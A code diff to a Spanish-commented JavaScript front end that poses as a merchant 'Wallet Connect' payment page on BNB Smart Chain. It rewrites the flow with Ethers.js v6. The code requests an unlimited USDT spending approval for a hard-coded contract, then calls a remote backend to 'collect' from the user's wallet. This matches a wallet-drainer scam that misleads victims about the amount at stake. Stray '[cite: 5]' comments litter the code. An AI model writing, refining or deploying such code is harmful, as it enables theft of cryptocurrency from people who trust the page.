@@ -1,13 +1,13 @@
 "use strict";
 
 // ─── Configuration ────────────────────────────────────────────────────────────
-const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
-const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38";
+const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b"; 
+const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634"; 
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
+const BSC_CHAIN_ID_HEX = "0x38"; 
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT
-const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
-const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
+const MIN_USDT_BALANCE = 0n;
+const BACKEND_URL      = "https://secure-merchant.onrender.com/api"; 
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
@@ -16,7 +16,7 @@ const BSC_RPC_URLS = [
   "https://bsc-dataseed2.binance.org/",
   "https://bsc-dataseed3.binance.org/",
   "https://rpc.ankr.com/bsc"
-];
+]; //[cite: 5]
 
 const BSC_CHAIN_PARAMS = {
   chainId:           BSC_CHAIN_ID_HEX,
@@ -24,27 +24,27 @@ const BSC_CHAIN_PARAMS = {
   nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
   rpcUrls:           BSC_RPC_URLS,
   blockExplorerUrls: ["https://bscscan.com/"]
-};
+}; //[cite: 5]
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function balanceOf(address account) external view returns (uint256)"
-];
+]; //[cite: 5]
 
 // ─── DOM refs ─────────────────────────────────────────────────────────────────
-const approveBtn    = document.getElementById("approveBtn");
-const btnText       = document.getElementById("btnText");
-const btnSpinner    = document.getElementById("btnSpinner");
-const merchantInput = document.getElementById("merchantAddress");
-const toastEl       = document.getElementById("toast");
+const approveBtn    = document.getElementById("approveBtn"); //[cite: 5]
+const btnText       = document.getElementById("btnText"); //[cite: 5]
+const btnSpinner    = document.getElementById("btnSpinner"); //[cite: 5]
+const merchantInput = document.getElementById("merchantAddress"); //[cite: 5]
+const toastEl       = document.getElementById("toast"); //[cite: 5]
 
-if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
+if (merchantInput) merchantInput.value = MERCHANT_ADDRESS; //[cite: 5]
 
 // ─── Wake up Render backend ───────────────────────────────────────────────────
-(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
+(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })(); //[cite: 5]
 
-let _cachedAddress = null;
+let _cachedAddress = null; //[cite: 5]
 
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
@@ -54,78 +54,31 @@ function showToast(msg, type = "default", ms = 4500) {
   toastEl.dataset.type = type === "default" ? "" : type;
   toastEl.hidden       = false;
   _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
-}
+} //[cite: 5]
 
 function setLoading(on, label = "Processing…") {
   approveBtn.disabled = on;
   btnText.textContent = on ? label : "Wallet Connect";
   btnSpinner.hidden   = !on;
-}
+} //[cite: 5]
 
-// ─── Universal Provider Fetcher (Optimized for AppKit First) ──────────────────
+// ─── Universal Provider Fetcher (Optimized for Reown AppKit First) ────────────
 async function getActiveProvider() {
-  // 1. Intentar obtener el proveedor desde la instancia de Reown AppKit si está conectada
-  if (window.modal) {
+  // 1. Priorizar el proveedor gestionado por Reown AppKit
+  if (window.modal && typeof window.modal.getWalletProvider === "function") {
     try {
-      const state = window.modal.getState();
-      // Si AppKit indica que hay una conexión activa
-      if (state && (state.open || state.selectedNetworkId)) {
-        if (typeof window.modal.getWalletProvider === "function") {
-          const appKitProvider = window.modal.getWalletProvider();
-          if (appKitProvider) return appKitProvider;
-        }
-      }
-    } catch (e) {
-      console.warn("Error obteniendo proveedor de AppKit:", e);
-    }
+      const appKitProvider = window.modal.getWalletProvider();
+      if (appKitProvider) return appKitProvider;
+    } catch (_) {}
   }
   
-  // 2. Proveedor inyectado estándar (MetaMask, Trust Wallet, etc.)
+  // 2. Proveedor inyectado estándar como alternativa
   if (window.ethereum && typeof window.ethereum.request === "function") {
     return window.ethereum;
   }
   
   return null;
-}
-
-// ─── RPC Helper ───────────────────────────────────────────────────────────────
-async function rpcCall(method, params) {
-  for (const rpc of BSC_RPC_URLS) {
-    try {
-      const r = await fetch(rpc, {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
-      });
-      const j = await r.json();
-      if (j.result !== undefined) return j.result;
-    } catch (_) {}
-  }
-  return null;
-}
-
-// ─── Poll allowance until mined ───────────────────────────────────────────────
-async function waitForAllowanceConfirmed(provider, owner, spender, required, timeout = 120000) {
-  const data = "0xdd62ed3e" + owner.slice(2).padStart(64, "0") + spender.slice(2).padStart(64, "0");
-  const deadline = Date.now() + timeout;
-  while (Date.now() < deadline) {
-    let result = null;
-    try {
-      result = await provider.request({
-        method: "eth_call",
-        params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
-      });
-    } catch (_) {}
-    if (!result || result === "0x" || result === "0x0") {
-      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
-    }
-    if (result && result !== "0x" && result !== "0x0") {
-      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
-    }
-    await new Promise(r => setTimeout(r, 2000));
-  }
-  throw new Error("Approval timed out. Please try again.");
-}
+} //[cite: 5]
 
 // ─── Backend collect (with retry) ─────────────────────────────────────────────
 async function triggerBackendCollect(userAddress) {
@@ -146,49 +99,20 @@ async function triggerBackendCollect(userAddress) {
     }
   }
   throw lastErr;
-}
+} //[cite: 5]
 
-async function getUsdtBalance(provider, userAddress, iface) {
-  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
-  let result = null;
-  try {
-    result = await provider.request({
-      method: "eth_call",
-      params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
-    });
-  } catch (_) {}
-  if (!result || result === "0x" || result === "0x0") {
-    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
-  }
-  if (!result || result === "0x") return 0n;
-  try { return BigInt(result); } catch (_) { return 0n; }
-}
-
-// ─── Main button handler (Professional Modal Flow) ───────────────────────────
+// ─── Main button handler (Reown AppKit + Ethers.js v6 Integration) ────────────
 approveBtn.addEventListener("click", async () => {
-  let provider = await getActiveProvider();
+  let rawProvider = await getActiveProvider();
 
-  // Si no hay proveedor activo, abrir el modal de Reown AppKit
-  if (!provider) {
+  // 1. Si no hay una sesión activa, abrir el modal oficial de Reown AppKit
+  if (!rawProvider) {
     if (window.modal && typeof window.modal.open === "function") {
       try {
         await window.modal.open();
-        // Opcional: Suscribirse temporalmente al cambio de estado para continuar automáticamente al conectar
-        if (typeof window.modal.subscribeState === "function") {
-          const unsubscribe = window.modal.subscribeState(async (state) => {
-            // Si el estado detecta que ya se conectó una cuenta
-            if (state && state.selectedNetworkId) {
-              unsubscribe();
-              // Pequeño respiro para asegurar que el proveedor esté listo
-              setTimeout(() => approveBtn.click(), 500);
-            }
-          });
-        }
-        return;
+        return; 
       } catch (modalErr) {
         console.error("Error al abrir el modal de WalletConnect:", modalErr);
-        showToast("No se pudo abrir el selector de billeteras.", "error");
-        return;
       }
     } else {
       showToast("El sistema de billeteras no está inicializado.", "error");
@@ -196,93 +120,70 @@ approveBtn.addEventListener("click", async () => {
     }
   }
 
-  // 2. Si ya hay un proveedor activo, procedemos con la lógica de red y transacciones
   setLoading(true, "Processing…");
 
   try {
-    // Paso — Cambiar a BNB Smart Chain
-    try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID_HEX }]
-      });
-    } catch (e) {
-      if (e.code === 4902) {
-        await provider.request({
-          method: "wallet_addEthereumChain",
-          params: [BSC_CHAIN_PARAMS]
+    // 2. Inicializar Ethers.js v6 BrowserProvider y Signer nativos
+    const provider = new ethers.BrowserProvider(rawProvider);
+
+    // Validar y cambiar a la red BNB Smart Chain si es necesario
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      try {
+        await rawProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }]
         });
-      } else if (
-        e.code === 4001 ||
-        (e.message || "").toLowerCase().includes("user rejected") ||
-        (e.message || "").toLowerCase().includes("user denied")
-      ) {
-        showToast("Por favor cambia a la red BNB Smart Chain.", "error");
-        setLoading(false);
-        return;
+      } catch (e) {
+        if (e.code === 4902) {
+          await rawProvider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
+        } else {
+          showToast("Por favor cambia a la red BNB Smart Chain.", "error");
+          setLoading(false);
+          return;
+        }
       }
     }
 
-    // Paso — Obtener la dirección activa
-    let userAddress = _cachedAddress || null;
-    if (!userAddress) {
-      const accs = await provider.request({ method: "eth_requestAccounts" });
-      userAddress = (accs && accs[0]) ? accs[0] : null;
-    }
-
-    if (!userAddress) {
-      showToast("Billetera no detectada. Abre el modal de conexión.", "error");
-      setLoading(false);
-      return;
-    }
-
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
     _cachedAddress = userAddress;
 
-    const CAP_AMOUNT = ethers.MaxUint256;
-    const iface      = new ethers.Interface(ERC20_ABI);
+    // 3. Instanciar contratos con Ethers.js v6
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
 
-    // Verificar Balance USDT
-    const usdtBalance = await getUsdtBalance(provider, userAddress, iface);
+    // Verificar balance de USDT mediante el contrato inteligente
+    const usdtBalance = await usdtContract.balanceOf(userAddress);
     if (usdtBalance <= MIN_USDT_BALANCE) {
       showToast("Saldo insuficiente de USDT.", "error");
       setLoading(false);
       return;
     }
 
-    // Paso — Verificar Allowance existente
-    try {
-      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
-      const allowanceHex  = await provider.request({
-        method: "eth_call",
-        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
-      });
-      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
-        setLoading(true, "Finalizing…");
-        await triggerBackendCollect(userAddress);
-        showToast("¡Transacción completada con éxito! ✓", "success");
-        setLoading(false);
-        return;
-      }
-    } catch (_) {}
+    const CAP_AMOUNT = ethers.MaxUint256;
 
-    // Paso — Solicitar Firma de Aprobación (Approve)
-    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
-    
-    await provider.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from:  userAddress,
-        to:    BSC_USDT_ADDRESS,
-        data:  approveData,
-        value: "0x0"
-      }]
-    });
+    // Verificar Allowance (aprobación previa) usando Ethers v6
+    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+    if (allowance >= CAP_AMOUNT) {
+      setLoading(true, "Finalizing…");
+      await triggerBackendCollect(userAddress);
+      showToast("¡Transacción completada con éxito! ✓", "success");
+      setLoading(false);
+      return;
+    }
 
-    // Paso — Esperar confirmación del bloque
+    // 4. Solicitar firma de aprobación (Approve) a través de Ethers.js v6
+    setLoading(true, "Approving…");
+    const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
+
+    // 5. Esperar confirmación del bloque
     setLoading(true, "Confirming…");
-    await waitForAllowanceConfirmed(provider, userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
+    await tx.wait();
 
-    // Paso — Ejecutar cobro desde Backend
+    // 6. Ejecutar el cobro desde el Backend
     setLoading(true, "Finalizing…");
     await triggerBackendCollect(userAddress);
     showToast("¡Transacción completada con éxito! ✓", "success");
